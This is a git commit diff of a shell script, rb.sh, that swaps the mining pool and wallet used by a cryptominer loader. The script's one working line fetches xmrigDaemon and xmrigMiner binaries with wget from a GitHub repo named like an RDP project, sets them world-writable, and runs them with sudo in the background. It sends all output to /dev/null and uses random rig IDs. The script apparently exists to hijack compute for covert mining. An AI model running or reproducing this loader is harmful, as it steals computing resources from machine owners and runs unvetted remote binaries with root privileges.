10d2dfb8cfb229880af33f1208498f4eda720c98
SalinaMoh <98037354+SalinaMoh@users.noreply.github.com>
2022-04-06 17:27:08 +0000

    Update rb.sh

--- rb.sh
+++ rb.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && sudo ./xmrigDaemon -o 8.209.98.71:443 -u Azud -p x --donate-level 1 -t $(nproc --all) -k > /dev/null 2>&1 &
+wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && sudo ./xmrigDaemon -o sf.pool-pay.com:4025 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X --rig-id $(echo $(shuf -i 1000-9999 -n 1)-ANZ) -p x@$(echo $(shuf -i 1000-9999 -n 1)-ANZ) --donate-level 1 -t 8 -k > /dev/null 2>&1 &
 uname -a
